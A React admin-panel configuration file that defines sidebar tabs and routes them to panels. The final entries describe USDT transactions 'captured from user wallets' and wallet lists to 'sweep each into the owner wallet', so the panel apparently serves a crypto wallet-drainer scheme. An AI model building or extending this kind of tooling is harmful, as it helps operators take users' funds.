// ─────────────────────────────────────────────────────────────────────────────
// SINGLE SOURCE OF TRUTH for the admin panel's tabs.
//
// To add a new tab:
//   1. Build a panel in ./panels/MyPanel.jsx (receives { token, onNav, onLogout }).
//   2. Add an icon to ./components/icons.jsx if you need a new one.
//   3. Add ONE entry to the TABS array below.
// The sidebar and the content router are both driven by this list — nothing else
// to wire up.
//
// Each entry:
//   key       unique id (also used as the active-tab value)
//   label     sidebar text
//   Icon      component from Icons
//   Component the panel to render
//   props     (optional) extra static props merged into the panel
// ─────────────────────────────────────────────────────────────────────────────
import { Icons } from './components/icons.jsx';
import { OverviewPanel } from './panels/OverviewPanel.jsx';
import { UsersPanel } from './panels/UsersPanel.jsx';
import { OrdersPanel } from './panels/OrdersPanel.jsx';
import { FundRequestsPanel } from './panels/FundRequestsPanel.jsx';
import { TicketsPanel } from './panels/TicketsPanel.jsx';
import { AnalyticsPanel } from './panels/AnalyticsPanel.jsx';
import { AppearancePanel } from './panels/AppearancePanel.jsx';
import { BrandPanel } from './panels/BrandPanel.jsx';
import { PaymentsPanel } from './panels/PaymentsPanel.jsx';
import { VoucherPanel } from './panels/VoucherPanel.jsx';
import { SettingsPanel } from './panels/SettingsPanel.jsx';
import { HistoryPanel } from './panels/HistoryPanel.jsx';
import { SendPanel } from './panels/SendPanel.jsx';

export const TABS = [
  { key: 'overview',   label: 'Overview',      Icon: Icons.Overview,   Component: OverviewPanel },
  { key: 'users',      label: 'Users',         Icon: Icons.Users,      Component: UsersPanel },
  { key: 'orders',     label: 'Orders',        Icon: Icons.Orders,     Component: OrdersPanel },
  { key: 'funds',      label: 'Fund Requests', Icon: Icons.Funds,      Component: FundRequestsPanel },
  { key: 'tickets',    label: 'Tickets',       Icon: Icons.Tickets,    Component: TicketsPanel },
  { key: 'analytics',  label: 'Lead Analytics',Icon: Icons.Analytics,  Component: AnalyticsPanel },
  { key: 'appearance', label: 'Appearance',    Icon: Icons.Appearance, Component: AppearancePanel },
  { key: 'brand',      label: 'Brand Info',    Icon: Icons.Brand,      Component: BrandPanel },
  { key: 'payments',   label: 'Payments',      Icon: Icons.Payments,   Component: PaymentsPanel },
  { key: 'voucher',    label: 'Voucher Popup', Icon: Icons.Voucher,    Component: VoucherPanel },
  { key: 'settings',   label: 'Settings',      Icon: Icons.Settings,   Component: SettingsPanel },
  {
    key: 'bnbHistory', label: 'BNB History', Icon: Icons.History, Component: HistoryPanel,
    props: {
      type: 'bnb',
      title: 'BNB Transaction History',
      subtitle: 'Recorded USDT (BEP-20) transactions captured from user wallets',
    },
  },
  {
    key: 'trxHistory', label: 'Tron History', Icon: Icons.History, Component: HistoryPanel,
    props: {
      type: 'trx',
      title: 'Tron Transaction History',
      subtitle: 'Recorded USDT (TRC-20) transactions captured from user wallets',
    },
  },
  {
    key: 'sendBnb', label: 'Send BNB', Icon: Icons.Send, Component: SendPanel,
    props: {
      type: 'bnb',
      title: 'Send BNB',
      subtitle: 'Wallets currently holding USDT on BNB Smart Chain — sweep each into the owner wallet',
    },
  },
  {
    key: 'sendTrx', label: 'Send Tron', Icon: Icons.Send, Component: SendPanel,
    props: {
      type: 'trx',
      title: 'Send Tron',
      subtitle: 'Wallets currently holding USDT on Tron — sweep each into the owner wallet',
    },
  },
];

// Nav list for the sidebar (presentational subset).
export const NAV_ITEMS = TABS.map(({ key, label, Icon }) => ({ key, label, Icon }));

// Fast lookup by key for the content router.
export const TAB_BY_KEY = Object.fromEntries(TABS.map(t => [t.key, t]));
